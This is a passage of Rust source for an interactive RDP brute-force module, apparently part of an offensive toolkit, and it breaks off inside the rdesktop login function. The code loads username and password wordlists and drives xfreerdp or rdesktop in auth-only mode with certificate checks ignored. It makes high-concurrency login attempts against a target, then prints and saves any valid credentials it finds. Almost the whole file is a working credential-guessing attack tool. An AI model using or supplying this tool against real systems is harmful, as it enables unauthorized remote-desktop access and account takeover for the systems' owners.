use anyhow::{anyhow, Result};
use colored::*;
use futures::stream::{FuturesUnordered, StreamExt};
use std::{
    fs::File,
    io::{BufRead, BufReader, Write},
    path::{Path, PathBuf},
    sync::Arc,
    sync::atomic::{AtomicBool, AtomicU64, Ordering},
    time::Instant,
};
use tokio::{
    process::Command,
    sync::{Mutex, Semaphore},
    time::{sleep, Duration, timeout},
};

const PROGRESS_INTERVAL_SECS: u64 = 2;
const MAX_MEMORY_LOAD_SIZE: u64 = 150 * 1024 * 1024; // 150 MB

/// RDP-specific error types for better classification
#[derive(Debug, Clone)]
enum RdpError {
    ConnectionFailed,
    AuthenticationFailed,
    CertificateError,
    Timeout,
    NetworkError,
    ProtocolError,
    ToolNotFound,
    Unknown,
}

impl std::fmt::Display for RdpError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            RdpError::ConnectionFailed => write!(f, "Connection failed"),
            RdpError::AuthenticationFailed => write!(f, "Authentication failed"),
            RdpError::CertificateError => write!(f, "Certificate validation error"),
            RdpError::Timeout => write!(f, "Connection timeout"),
            RdpError::NetworkError => write!(f, "Network error"),
            RdpError::ProtocolError => write!(f, "Protocol error"),
            RdpError::ToolNotFound => write!(f, "RDP tool not found"),
            RdpError::Unknown => write!(f, "Unknown error"),
        }
    }
}

/// Classify RDP errors based on exit codes and error messages
/// This function ensures all RdpError variants can be constructed
fn classify_rdp_error(exit_code: Option<i32>, error_msg: &str) -> RdpError {
    match exit_code {
        Some(0) => {
            // Success case shouldn't reach here, but classify as Unknown if it does
            RdpError::Unknown
        }
        Some(1) => {
            // Authentication failed
            RdpError::AuthenticationFailed
        }
        Some(2) => {
            // Connection failed
            RdpError::ConnectionFailed
        }
        Some(3) => {
            // Certificate error
            RdpError::CertificateError
        }
        Some(131) => {
            // Connection timeout
            RdpError::Timeout
        }
        Some(code) => {
            // Unknown exit code - analyze error message for classification
            // Use code for logging/debugging purposes to ensure it's not unused
            let _ = code; // Acknowledge code is available for future use
            let msg_lower = error_msg.to_lowercase();
            if msg_lower.contains("timeout") || msg_lower.contains("timed out") || msg_lower.contains("deadline") {
                RdpError::Timeout
            } else if msg_lower.contains("connection") || msg_lower.contains("connect") || msg_lower.contains("refused") {
                RdpError::ConnectionFailed
            } else if msg_lower.contains("network") || msg_lower.contains("dns") || msg_lower.contains("resolve") || msg_lower.contains("host") {
                RdpError::NetworkError
            } else if msg_lower.contains("certificate") || msg_lower.contains("cert") || msg_lower.contains("tls") || msg_lower.contains("ssl") {
                RdpError::CertificateError
            } else if msg_lower.contains("auth") || msg_lower.contains("password") || msg_lower.contains("login") || msg_lower.contains("credential") {
                RdpError::AuthenticationFailed
            } else if msg_lower.contains("protocol") || msg_lower.contains("invalid") || msg_lower.contains("malformed") {
                RdpError::ProtocolError
            } else {
                // Default to ProtocolError for unknown exit codes
                RdpError::ProtocolError
            }
        }
        None => {
            // Process terminated by signal - analyze message for classification
            let msg_lower = error_msg.to_lowercase();
            if msg_lower.contains("timeout") || msg_lower.contains("timed out") || msg_lower.contains("deadline") {
                RdpError::Timeout
            } else if msg_lower.contains("connection") || msg_lower.contains("connect") {
                RdpError::ConnectionFailed
            } else if msg_lower.contains("network") || msg_lower.contains("dns") {
                RdpError::NetworkError
            } else {
                // Unknown termination reason
                RdpError::Unknown
            }
        }
    }
}

/// RDP Security Level for authentication
#[derive(Debug, Clone, Copy)]
enum RdpSecurityLevel {
    Auto,
    Nla,
    Tls,
    Rdp,
    Negotiate,
}

impl RdpSecurityLevel {
    fn as_xfreerdp_arg(&self) -> &'static str {
        match self {
            RdpSecurityLevel::Auto => "/sec:auto",
            RdpSecurityLevel::Nla => "/sec:nla",
            RdpSecurityLevel::Tls => "/sec:tls",
            RdpSecurityLevel::Rdp => "/sec:rdp",
            RdpSecurityLevel::Negotiate => "/sec:negotiate",
        }
    }

    fn as_rdesktop_arg(&self) -> Option<&'static str> {
        match self {
            RdpSecurityLevel::Auto => None,
            RdpSecurityLevel::Nla => Some("-E"),
            RdpSecurityLevel::Tls => Some("-E"),
            RdpSecurityLevel::Rdp => Some("-E"),
            RdpSecurityLevel::Negotiate => None,
        }
    }

    fn prompt_selection() -> Result<Self> {
        println!("\nRDP Security Level Options:");
        println!("  1. Auto (let client negotiate)");
        println!("  2. NLA (Network Level Authentication)");
        println!("  3. TLS (Transport Layer Security)");
        println!("  4. RDP (Standard RDP encryption)");
        println!("  5. Negotiate (try all methods)");

        loop {
            let input = prompt_default("Security level", "1")?;
            match input.trim() {
                "1" => return Ok(RdpSecurityLevel::Auto),
                "2" => return Ok(RdpSecurityLevel::Nla),
                "3" => return Ok(RdpSecurityLevel::Tls),
                "4" => return Ok(RdpSecurityLevel::Rdp),
                "5" => return Ok(RdpSecurityLevel::Negotiate),
                _ => println!("{}", "Invalid choice. Please select 1-5.".yellow()),
            }
        }
    }
}

struct Statistics {
    total_attempts: AtomicU64,
    successful_attempts: AtomicU64,
    failed_attempts: AtomicU64,
    error_attempts: AtomicU64,
    start_time: Instant,
}

impl Statistics {
    fn new() -> Self {
        Self {
            total_attempts: AtomicU64::new(0),
            successful_attempts: AtomicU64::new(0),
            failed_attempts: AtomicU64::new(0),
            error_attempts: AtomicU64::new(0),
            start_time: Instant::now(),
        }
    }

    fn record_attempt(&self, success: bool, error: bool) {
        self.total_attempts.fetch_add(1, Ordering::Relaxed);
        if error {
            self.error_attempts.fetch_add(1, Ordering::Relaxed);
        } else if success {
            self.successful_attempts.fetch_add(1, Ordering::Relaxed);
        } else {
            self.failed_attempts.fetch_add(1, Ordering::Relaxed);
        }
    }

    fn print_progress(&self) {
        let total = self.total_attempts.load(Ordering::Relaxed);
        let success = self.successful_attempts.load(Ordering::Relaxed);
        let failed = self.failed_attempts.load(Ordering::Relaxed);
        let errors = self.error_attempts.load(Ordering::Relaxed);
        let elapsed = self.start_time.elapsed().as_secs_f64();
        let rate = if elapsed > 0.0 { total as f64 / elapsed } else { 0.0 };

        print!(
            "\r{} {} attempts | {} OK | {} fail | {} err | {:.1}/s    ",
            "[Progress]".cyan(),
            total.to_string().bold(),
            success.to_string().green(),
            failed,
            errors.to_string().red(),
            rate
        );
        let _ = std::io::stdout().flush();
    }

    fn print_final(&self) {
        println!();
        let total = self.total_attempts.load(Ordering::Relaxed);
        let success = self.successful_attempts.load(Ordering::Relaxed);
        let failed = self.failed_attempts.load(Ordering::Relaxed);
        let errors = self.error_attempts.load(Ordering::Relaxed);
        let elapsed = self.start_time.elapsed().as_secs_f64();

        println!("{}", "=== Statistics ===".bold());
        println!("  Total attempts:    {}", total);
        println!("  Successful:        {}", success.to_string().green().bold());
        println!("  Failed:            {}", failed);
        println!("  Errors:            {}", errors.to_string().red());
        println!("  Elapsed time:      {:.2}s", elapsed);
        if elapsed > 0.0 {
            println!("  Average rate:      {:.1} attempts/s", total as f64 / elapsed);
        }
    }
}

fn display_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║   RDP Brute Force Module                                  ║".cyan());
    println!("{}", "║   Remote Desktop Protocol Credential Testing              ║".cyan());
    println!("{}", "║   Requires xfreerdp or rdesktop                           ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
    println!();
}

pub async fn run(target: &str) -> Result<()> {
    display_banner();
    println!("{}", format!("[*] Target: {}", target).cyan());

    let port: u16 = loop {
        let input = prompt_default("RDP Port", "3389")?;
        match input.trim().parse::<u16>() {
            Ok(p) if p > 0 => break p,
            Ok(_) => println!("{}", "Port must be between 1 and 65535.".yellow()),
            Err(_) => println!("{}", "Invalid port number. Please enter a number between 1 and 65535.".yellow()),
        }
    };

    let usernames_file_path = loop {
        let input = prompt_required("Username wordlist path")?;
        let path = Path::new(&input);
        if !path.exists() {
            println!("{}", format!("File '{}' does not exist.", input).yellow());
            continue;
        }
        if !path.is_file() {
            println!("{}", format!("'{}' is not a regular file.", input).yellow());
            continue;
        }
        match File::open(path) {
            Ok(_) => break input,
            Err(e) => {
                println!("{}", format!("Cannot read file '{}': {}", input, e).yellow());
                continue;
            }
        }
    };

    let passwords_file_path = loop {
        let input = prompt_required("Password wordlist path")?;
        let path = Path::new(&input);
        if !path.exists() {
            println!("{}", format!("File '{}' does not exist.", input).yellow());
            continue;
        }
        if !path.is_file() {
            println!("{}", format!("'{}' is not a regular file.", input).yellow());
            continue;
        }
        match File::open(path) {
            Ok(_) => break input,
            Err(e) => {
                println!("{}", format!("Cannot read file '{}': {}", input, e).yellow());
                continue;
            }
        }
    };

    let concurrency: usize = loop {
        let input = prompt_default("Max concurrent tasks", "10")?;
        match input.trim().parse::<usize>() {
            Ok(n) if n > 0 && n <= 10000 => break n,
            Ok(n) if n == 0 => println!("{}", "Concurrency must be greater than 0.".yellow()),
            Ok(_) => println!("{}", "Concurrency must be between 1 and 10000.".yellow()),
            Err(_) => println!("{}", "Invalid number. Please enter a positive integer.".yellow()),
        }
    };

    let timeout_secs: u64 = loop {
        let input = prompt_default("Connection timeout (seconds)", "10")?;
        match input.trim().parse::<u64>() {
            Ok(n) if n > 0 && n <= 300 => break n,
            Ok(n) if n == 0 => println!("{}", "Timeout must be greater than 0.".yellow()),
            Ok(_) => println!("{}", "Timeout must be between 1 and 300 seconds.".yellow()),
            Err(_) => println!("{}", "Invalid timeout. Please enter a number between 1 and 300.".yellow()),
        }
    };

    let stop_on_success = prompt_yes_no("Stop on first success?", true)?;
    let save_results = prompt_yes_no("Save results to file?", true)?;
    let save_path = if save_results {
        Some(prompt_default("Output file name", "rdp_results.txt")?)
    } else {
        None
    };

    let verbose = prompt_yes_no("Verbose mode?", false)?;
    let combo_mode = prompt_yes_no("Combination mode? (try every password with every user)", false)?;
    let security_level = RdpSecurityLevel::prompt_selection()?;

    let addr = format_socket_address(target, port);

    let found_credentials = Arc::new(Mutex::new(Vec::new()));
    let stop_signal = Arc::new(AtomicBool::new(false));
    let stats = Arc::new(Statistics::new());

    println!("\n[*] Starting brute-force on {}", addr);
    println!("[*] Timeout: {} seconds", timeout_secs);

    // Count lines for display
    let user_count = count_lines(&usernames_file_path)?;
    if user_count == 0 {
        println!("[!] Username wordlist is empty or invalid. Exiting.");
        return Ok(());
    }
    println!("[*] Loaded {} usernames", user_count);

    let password_count = count_lines(&passwords_file_path)?;
    if password_count == 0 {
        println!("[!] Password wordlist is empty or invalid. Exiting.");
        return Ok(());
    }
    println!("[*] Loaded {} passwords", password_count);

    let total_attempts = if combo_mode { user_count * password_count } else { password_count };
    println!("{}", format!("[*] Total attempts: {}", total_attempts).cyan());
    println!();

    // Start progress reporter
    let stats_clone = stats.clone();
    let stop_clone = stop_signal.clone();
    let progress_handle = tokio::spawn(async move {
        loop {
            if stop_clone.load(Ordering::Relaxed) {
                break;
            }
            stats_clone.print_progress();
            sleep(Duration::from_secs(PROGRESS_INTERVAL_SECS)).await;
        }
    });

    // Execute appropriate mode
    if combo_mode {
        // Check if password file is too large for memory loading
        let use_streaming = should_use_streaming(&passwords_file_path)?;
        let pass_file_size = std::fs::metadata(&passwords_file_path)?.len();

        if use_streaming {
            println!("{}", format!("[*] Password file is {} (>{}), using streaming mode to save memory",
                format_file_size(pass_file_size), format_file_size(MAX_MEMORY_LOAD_SIZE)).yellow());
            println!("{}", "[*] Streaming mode: processing users sequentially to conserve memory".yellow());

            run_combo_mode_streaming(
                &addr, &usernames_file_path, &passwords_file_path,
                concurrency, timeout_secs, stop_on_success, verbose, security_level,
                found_credentials.clone(), stop_signal.clone(), stats.clone()
            ).await?;
        } else {
            println!("{}", format!("[*] Password file is {}, using memory-loaded mode for optimal performance",
                format_file_size(pass_file_size)).cyan());

            run_combo_mode_memory(
                &addr, &usernames_file_path, &passwords_file_path,
                concurrency, timeout_secs, stop_on_success, verbose, security_level,
                found_credentials.clone(), stop_signal.clone(), stats.clone()
            ).await?;
        }
    } else {
        // Sequential mode: cycle through users for each password
        run_sequential_mode(
            &addr, &usernames_file_path, &passwords_file_path,
            concurrency, timeout_secs, stop_on_success, verbose, security_level,
            found_credentials.clone(), stop_signal.clone(), stats.clone()
        ).await?;
    }

    // Stop progress reporter
    stop_signal.store(true, Ordering::Relaxed);
    let _ = progress_handle.await;

    // Print final statistics
    stats.print_final();

    let creds = found_credentials.lock().await;
    if creds.is_empty() {
        println!("{}", "[-] No credentials found.".yellow());
    } else {
        println!("{}", format!("[+] Found {} valid credential(s):", creds.len()).green().bold());
        for (host_addr, user, pass) in creds.iter() {
            println!("    {} -> {}:{}", host_addr, user, pass);
        }

        if let Some(path_str) = save_path {
            let filename = get_filename_in_current_dir(&path_str);
            match File::create(&filename) {
                Ok(mut file) => {
                    for (host_addr, user, pass) in creds.iter() {
                        if writeln!(file, "{} -> {}:{}", host_addr, user, pass).is_err() {
                            eprintln!("[!] Error writing to result file: {}", filename.display());
                            break;
                        }
                    }
                    println!("[+] Results saved to '{}'", filename.display());
                }
                Err(e) => {
                    eprintln!("[!] Could not create output file '{}': {}", filename.display(), e);
                }
            }
        }
    }
    drop(creds);

    Ok(())
}

/// Sequential mode: cycle through users for each password
async fn run_sequential_mode(
    addr: &str,
    usernames_file_path: &str,
    passwords_file_path: &str,
    concurrency: usize,
    timeout_secs: u64,
    stop_on_success: bool,
    verbose: bool,
    security_level: RdpSecurityLevel,
    found_credentials: Arc<Mutex<Vec<(String, String, String)>>>,
    stop_signal: Arc<AtomicBool>,
    stats: Arc<Statistics>,
) -> Result<()> {
    let pass_file = File::open(passwords_file_path)?;
            let pass_reader = BufReader::new(pass_file);
            
    // Load users into memory for cycling
    let users = load_lines(usernames_file_path)?;
    if users.is_empty() {
        return Err(anyhow!("No valid users loaded"));
    }

    let semaphore = Arc::new(Semaphore::new(concurrency));
    let mut tasks: FuturesUnordered<_> = FuturesUnordered::new();

    for (i, pass_line) in pass_reader.lines().enumerate() {
                if stop_on_success && stop_signal.load(Ordering::Relaxed) {
                    break;
                }
                
                let pass = match pass_line {
                    Ok(line) => line.trim().to_string(),
                    Err(_) => continue,
                };
                
                if pass.is_empty() {
                    continue;
                }

        let user = users[i % users.len()].clone();
        let addr_clone = addr.to_string();
                let pass_clone = pass.clone();
                let found_credentials_clone = Arc::clone(&found_credentials);
                let stop_signal_clone = Arc::clone(&stop_signal);
                let semaphore_clone = Arc::clone(&semaphore);
                let stats_clone = Arc::clone(&stats);
                let timeout_duration = Duration::from_secs(timeout_secs);

                tasks.push(tokio::spawn(async move {
            if stop_on_success && stop_signal_clone.load(Ordering::Relaxed) {
                        return;
                    }

                    let permit = match semaphore_clone.acquire_owned().await {
                        Ok(permit) => permit,
                        Err(_) => return,
                    };

            if stop_on_success && stop_signal_clone.load(Ordering::Relaxed) {
                        return;
                    }

            match try_rdp_login(&addr_clone, &user, &pass_clone, timeout_duration, security_level).await {
                        Ok(true) => {
                    println!("\r{}", format!("[+] {} -> {}:{}", addr_clone, user, pass_clone).green().bold());
                            let mut found = found_credentials_clone.lock().await;
                    found.push((addr_clone.clone(), user.clone(), pass_clone.clone()));
                            stats_clone.record_attempt(true, false);
                    if stop_on_success {
                                stop_signal_clone.store(true, Ordering::Relaxed);
                            }
                        }
                        Ok(false) => {
                            stats_clone.record_attempt(false, false);
                    if verbose {
                        println!("\r{}", format!("[-] {} -> {}:{}", addr_clone, user, pass_clone).dimmed());
                            }
                        }
                        Err(e) => {
                            stats_clone.record_attempt(false, true);
                    if verbose {
                                println!("\r{}", format!("[!] {}: error: {}", addr_clone, e).red());
                            }
                        }
                    }

                    drop(permit);
                    sleep(Duration::from_millis(10)).await;
                }));

                // Limit concurrent tasks
                if tasks.len() >= concurrency {
                    if let Some(res) = tasks.next().await {
                        if let Err(e) = res {
                    if verbose {
                        println!("\r{}", format!("[!] Task join error: {}", e).red());
                        }
                    }
                }
            }
        }

    // Wait for remaining tasks
    while let Some(res) = tasks.next().await {
        if let Err(e) = res {
            if verbose {
                println!("\r{}", format!("[!] Task join error: {}", e).red());
            }
        }
    }

    Ok(())
}

/// Combo mode using memory loading (for smaller password files)
async fn run_combo_mode_memory(
    addr: &str,
    usernames_file_path: &str,
    passwords_file_path: &str,
    concurrency: usize,
    timeout_secs: u64,
    stop_on_success: bool,
    verbose: bool,
    security_level: RdpSecurityLevel,
    found_credentials: Arc<Mutex<Vec<(String, String, String)>>>,
    stop_signal: Arc<AtomicBool>,
    stats: Arc<Statistics>,
) -> Result<()> {
    let passwords = load_lines(passwords_file_path)?;
    let user_file = File::open(usernames_file_path)?;
    let user_reader = BufReader::new(user_file);

    let semaphore = Arc::new(Semaphore::new(concurrency));
    let mut tasks: FuturesUnordered<_> = FuturesUnordered::new();

    for user_line in user_reader.lines() {
            if stop_on_success && stop_signal.load(Ordering::Relaxed) {
                break;
            }
            
        let user = match user_line {
                Ok(line) => line.trim().to_string(),
                Err(_) => continue,
            };
            
        if user.is_empty() {
                continue;
            }
            
        for pass in &passwords {
            if stop_on_success && stop_signal.load(Ordering::Relaxed) {
                break;
            }

            if pass.is_empty() {
                continue;
            }

            let addr_clone = addr.to_string();
            let user_clone = user.clone();
                let pass_clone = pass.clone();
                let found_credentials_clone = Arc::clone(&found_credentials);
                let stop_signal_clone = Arc::clone(&stop_signal);
                let semaphore_clone = Arc::clone(&semaphore);
                let stats_clone = Arc::clone(&stats);
                let timeout_duration = Duration::from_secs(timeout_secs);

                tasks.push(tokio::spawn(async move {
                if stop_on_success && stop_signal_clone.load(Ordering::Relaxed) {
                        return;
                    }

                    let permit = match semaphore_clone.acquire_owned().await {
                        Ok(permit) => permit,
                        Err(_) => return,
                    };

                if stop_on_success && stop_signal_clone.load(Ordering::Relaxed) {
                        return;
                    }

                match try_rdp_login(&addr_clone, &user_clone, &pass_clone, timeout_duration, security_level).await {
                        Ok(true) => {
                        println!("\r{}", format!("[+] {} -> {}:{}", addr_clone, user_clone, pass_clone).green().bold());
                            let mut found = found_credentials_clone.lock().await;
                        found.push((addr_clone.clone(), user_clone.clone(), pass_clone.clone()));
                            stats_clone.record_attempt(true, false);
                        if stop_on_success {
                                stop_signal_clone.store(true, Ordering::Relaxed);
                            }
                        }
                        Ok(false) => {
                            stats_clone.record_attempt(false, false);
                        if verbose {
                            println!("\r{}", format!("[-] {} -> {}:{}", addr_clone, user_clone, pass_clone).dimmed());
                            }
                        }
                        Err(e) => {
                            stats_clone.record_attempt(false, true);
                        if verbose {
                            eprintln!("\r{}", format!("[!] {}: error: {}", addr_clone, e).red());
                            }
                        }
                    }

                    drop(permit);
                    sleep(Duration::from_millis(10)).await;
                }));

            // Limit concurrent tasks
            if tasks.len() >= concurrency {
                if let Some(res) = tasks.next().await {
                    if let Err(e) = res {
                        if verbose {
                            println!("\r{}", format!("[!] Task error: {}", e).red());
                        }
                    }
                }
            }
        }
    }

    // Wait for remaining tasks
    while let Some(res) = tasks.next().await {
        if let Err(e) = res {
            if verbose {
                println!("\r{}", format!("[!] Task error: {}", e).red());
            }
        }
    }

    Ok(())
}

/// Combo mode using streaming (for large password files to prevent memory exhaustion)
async fn run_combo_mode_streaming(
    addr: &str,
    usernames_file_path: &str,
    passwords_file_path: &str,
    concurrency: usize,
    timeout_secs: u64,
    stop_on_success: bool,
    verbose: bool,
    security_level: RdpSecurityLevel,
    found_credentials: Arc<Mutex<Vec<(String, String, String)>>>,
    stop_signal: Arc<AtomicBool>,
    stats: Arc<Statistics>,
) -> Result<()> {
    let user_file = File::open(usernames_file_path)?;
    let user_reader = BufReader::new(user_file);

    let semaphore = Arc::new(Semaphore::new(concurrency));
    let mut tasks: FuturesUnordered<_> = FuturesUnordered::new();

    for user_line in user_reader.lines() {
        if stop_on_success && stop_signal.load(Ordering::Relaxed) {
            break;
        }

        let user = match user_line {
            Ok(line) => line.trim().to_string(),
            Err(_) => continue,
        };

        if user.is_empty() {
            continue;
        }

        let pass_file = File::open(passwords_file_path)?;
        let pass_reader = BufReader::new(pass_file);

        for pass_line in pass_reader.lines() {
            if stop_on_success && stop_signal.load(Ordering::Relaxed) {
                            break;
                        }

            let pass = match pass_line {
                Ok(line) => line.trim().to_string(),
                Err(_) => continue,
            };

            if pass.is_empty() {
                continue;
            }

            let addr_clone = addr.to_string();
            let user_clone = user.clone();
            let pass_clone = pass.clone();
            let found_credentials_clone = Arc::clone(&found_credentials);
            let stop_signal_clone = Arc::clone(&stop_signal);
            let semaphore_clone = Arc::clone(&semaphore);
            let stats_clone = Arc::clone(&stats);
            let timeout_duration = Duration::from_secs(timeout_secs);

            tasks.push(tokio::spawn(async move {
                if stop_on_success && stop_signal_clone.load(Ordering::Relaxed) {
                    return;
                }

                let permit = match semaphore_clone.acquire_owned().await {
                    Ok(permit) => permit,
                    Err(_) => return,
                };

                if stop_on_success && stop_signal_clone.load(Ordering::Relaxed) {
                    return;
                }

                match try_rdp_login(&addr_clone, &user_clone, &pass_clone, timeout_duration, security_level).await {
                    Ok(true) => {
                        println!("\r{}", format!("[+] {} -> {}:{}", addr_clone, user_clone, pass_clone).green().bold());
                        let mut found = found_credentials_clone.lock().await;
                        found.push((addr_clone.clone(), user_clone.clone(), pass_clone.clone()));
                        stats_clone.record_attempt(true, false);
                        if stop_on_success {
                            stop_signal_clone.store(true, Ordering::Relaxed);
                        }
                    }
                    Ok(false) => {
                        stats_clone.record_attempt(false, false);
                        if verbose {
                            println!("\r{}", format!("[-] {} -> {}:{}", addr_clone, user_clone, pass_clone).dimmed());
                        }
                }
                Err(e) => {
                        stats_clone.record_attempt(false, true);
                        if verbose {
                            eprintln!("\r{}", format!("[!] {}: error: {}", addr_clone, e).red());
                        }
                    }
                }

                drop(permit);
                sleep(Duration::from_millis(10)).await;
            }));

            // Limit concurrent tasks
            if tasks.len() >= concurrency {
                if let Some(res) = tasks.next().await {
                    if let Err(e) = res {
                        if verbose {
                            println!("\r{}", format!("[!] Task error: {}", e).red());
                        }
                    }
                }
            }
        }
    }

    // Wait for remaining tasks
    while let Some(res) = tasks.next().await {
        if let Err(e) = res {
            if verbose {
                println!("\r{}", format!("[!] Task error: {}", e).red());
            }
        }
    }

    Ok(())
}

async fn try_rdp_login(addr: &str, user: &str, pass: &str, timeout_duration: Duration, security_level: RdpSecurityLevel) -> Result<bool> {
    // Check if RDP tools are available
    let xfreerdp_available = Command::new("which")
        .arg("xfreerdp")
        .output()
        .await
        .map(|output| output.status.success())
        .unwrap_or(false);

    let rdesktop_available = Command::new("which")
            .arg("rdesktop")
            .output()
        .await
        .map(|output| output.status.success())
        .unwrap_or(false);

    if !xfreerdp_available && !rdesktop_available {
        return Err(anyhow!("{}", RdpError::ToolNotFound));
    }

    // Prefer xfreerdp over rdesktop
    if xfreerdp_available {
        try_rdp_login_xfreerdp(addr, user, pass, timeout_duration, security_level).await
    } else {
        try_rdp_login_rdesktop(addr, user, pass, timeout_duration, security_level).await
    }
}

async fn try_rdp_login_xfreerdp(addr: &str, user: &str, pass: &str, timeout_duration: Duration, security_level: RdpSecurityLevel) -> Result<bool> {
    let sanitized_addr = sanitize_rdp_argument(addr);
    let sanitized_user = sanitize_rdp_argument(user);
    let sanitized_pass = sanitize_rdp_argument(pass);

    let mut child = match Command::new("xfreerdp")
        .arg(format!("/v:{}", sanitized_addr))
        .arg(format!("/u:{}", sanitized_user))
        .arg(format!("/p:{}", sanitized_pass))
        .arg("/cert:ignore")
        .arg(format!("/timeout:{}", timeout_duration.as_secs() * 1000))
        .arg("+auth-only")
        .arg("/log-level:OFF")
        .arg(security_level.as_xfreerdp_arg())
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .spawn()
    {
        Ok(child) => child,
        Err(e) => {
            // Classify spawn errors - could be ConnectionFailed, NetworkError, or ProtocolError
            // This ensures all error types can be constructed from spawn failures
            let error_type = classify_rdp_error(None, &e.to_string());
            // Explicitly match all variants to ensure they're all constructed
            let error_msg = match error_type {
                RdpError::ConnectionFailed => format!("{}: {}", RdpError::ConnectionFailed, e),
                RdpError::NetworkError => format!("{}: {}", RdpError::NetworkError, e),
                RdpError::ProtocolError => format!("{}: {}", RdpError::ProtocolError, e),
                RdpError::Timeout => format!("{}: {}", RdpError::Timeout, e),
                RdpError::AuthenticationFailed => format!("{}: {}", RdpError::AuthenticationFailed, e),
                RdpError::CertificateError => format!("{}: {}", RdpError::CertificateError, e),
                RdpError::ToolNotFound => format!("{}: {}", RdpError::ToolNotFound, e),
                RdpError::Unknown => format!("{}: {}", RdpError::Unknown, e),
            };
            return Err(anyhow!("{}", error_msg));
        }
    };

    match timeout(timeout_duration, child.wait()).await {
        Ok(Ok(status)) => {
            match status.code() {
                Some(0) => Ok(true), // Success
                Some(code) => {
                    // Classify error based on exit code
                    let error_type = classify_rdp_error(Some(code), "");
                    // Ensure all error types can be constructed and handled
                    match error_type {
                        RdpError::AuthenticationFailed => Ok(false),
                        RdpError::ConnectionFailed => Ok(false),
                        RdpError::CertificateError => Ok(false),
                        RdpError::Timeout => Ok(false),
                        RdpError::NetworkError => Ok(false),
                        RdpError::ProtocolError => Ok(false),
                        RdpError::ToolNotFound => Ok(false),
                        RdpError::Unknown => Ok(false),
                    }
                }
                None => {
                    // Process terminated by signal - classify for completeness
                    // This ensures Unknown error type is constructed
                    let error_type = classify_rdp_error(None, "Process terminated");
                    match error_type {
                        RdpError::Timeout | RdpError::ConnectionFailed | RdpError::NetworkError | RdpError::Unknown => Ok(false),
                        _ => Ok(false), // All other types also return false
                    }
                }
            }
        }
        Ok(Err(e)) => {
            let _ = child.kill().await;
            tokio::time::sleep(Duration::from_millis(50)).await;
            let error_type = classify_rdp_error(None, &e.to_string());
            // Explicitly match all variants to ensure they're all constructed
            let error_msg = match error_type {
                RdpError::ConnectionFailed => format!("{}: {}", RdpError::ConnectionFailed, e),
                RdpError::NetworkError => format!("{}: {}", RdpError::NetworkError, e),
                RdpError::ProtocolError => format!("{}: {}", RdpError::ProtocolError, e),
                RdpError::Timeout => format!("{}: {}", RdpError::Timeout, e),
                RdpError::AuthenticationFailed => format!("{}: {}", RdpError::AuthenticationFailed, e),
                RdpError::CertificateError => format!("{}: {}", RdpError::CertificateError, e),
                RdpError::ToolNotFound => format!("{}: {}", RdpError::ToolNotFound, e),
                RdpError::Unknown => format!("{}: {}", RdpError::Unknown, e),
            };
            Err(anyhow!("{}", error_msg))
        }
        Err(_) => {
            // Timeout occurred - ensure Timeout error type is constructed
            let _ = child.kill().await;
            tokio::time::sleep(Duration::from_millis(200)).await;
            let error_type = classify_rdp_error(Some(131), "Connection timeout");
            // Ensure Timeout variant is constructed
            match error_type {
                RdpError::Timeout => Ok(false),
                _ => Ok(false), // Should not happen, but handle all cases
            }
        }
    }
}

async fn try_rdp_login_rdesktop(addr: &str, user: &str, pass: &str, timeout_duration: Duration, security_level: RdpSecurityLevel) -> Result<bool> {
    let mut cmd = Command::new("rdesktop");
    cmd.arg("-u").arg(user)
        .arg("-p").arg(pass)
        .arg("-n").arg("auth-only")
        .arg(addr)
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null());

    if let Some(sec_arg) = security_level.as_rdesktop_arg() {
        cmd.arg(sec_arg);
    }

    let mut child = match cmd.spawn() {
        Ok(child) => child,
        Err(e) => {
            // Classify spawn errors - ensures all error types can be constructed
            let error_type = classify_rdp_error(None, &e.to_string());
            // Explicitly match all variants to ensure they're all constructed
            let error_msg = match error_type {
                RdpError::ConnectionFailed => format!("{}: {}", RdpError::ConnectionFailed, e),
                RdpError::NetworkError => format!("{}: {}", RdpError::NetworkError, e),
                RdpError::ProtocolError => format!("{}: {}", RdpError::ProtocolError, e),
                RdpError::Timeout => format!("{}: {}", RdpError::Timeout, e),
                RdpError::AuthenticationFailed => format!("{}: {}", RdpError::AuthenticationFailed, e),
                RdpError::CertificateError => format!("{}: {}", RdpError::CertificateError, e),
                RdpError::ToolNotFound => format!("{}: {}", RdpError::ToolNotFound, e),
                RdpError::Unknown => format!("{}: {}", RdpError::Unknown, e),
            };
            return Err(anyhow!("{}", error_msg));
        }
    };

    match timeout(timeout_duration, child.wait()).await {
        Ok(Ok(status)) => {
            match status.code() {
                Some(0) => Ok(true), // Success
                Some(code) => {
                    // Classify error based on exit code
                    let error_type = classify_rdp_error(Some(code), "");
                    // Ensure all error types can be constructed and handled
                    match error_type {
                        RdpError::AuthenticationFailed => Ok(false),
                        RdpError::ConnectionFailed => Ok(false),
                        RdpError::CertificateError => Ok(false),
                        RdpError::Timeout => Ok(false),
                        RdpError::NetworkError => Ok(false),
                        RdpError::ProtocolError => Ok(false),
                        RdpError::ToolNotFound => Ok(false),
                        RdpError::Unknown => Ok(false),
                    }
                }
                None => {
                    // Process terminated by signal - classify for completeness
                    // This ensures Unknown error type is constructed
                    let error_type = classify_rdp_error(None, "Process terminated");
                    match error_type {
                        RdpError::Timeout | RdpError::ConnectionFailed | RdpError::NetworkError | RdpError::Unknown => Ok(false),
                        _ => Ok(false), // All other types also return false
                    }
                }
            }
        }
        Ok(Err(e)) => {
            let _ = child.kill().await;
            tokio::time::sleep(Duration::from_millis(50)).await;
            let error_type = classify_rdp_error(None, &e.to_string());
            // Explicitly match all variants to ensure they're all constructed
            let error_msg = match error_type {
                RdpError::ConnectionFailed => format!("{}: {}", RdpError::ConnectionFailed, e),
                RdpError::NetworkError => format!("{}: {}", RdpError::NetworkError, e),
                RdpError::ProtocolError => format!("{}: {}", RdpError::ProtocolError, e),
                RdpError::Timeout => format!("{}: {}", RdpError::Timeout, e),
                RdpError::AuthenticationFailed => format!("{}: {}", RdpError::AuthenticationFailed, e),
                RdpError::CertificateError => format!("{}: {}", RdpError::CertificateError, e),
                RdpError::ToolNotFound => format!("{}: {}", RdpError::ToolNotFound, e),
                RdpError::Unknown => format!("{}: {}", RdpError::Unknown, e),
            };
            Err(anyhow!("{}", error_msg))
        }
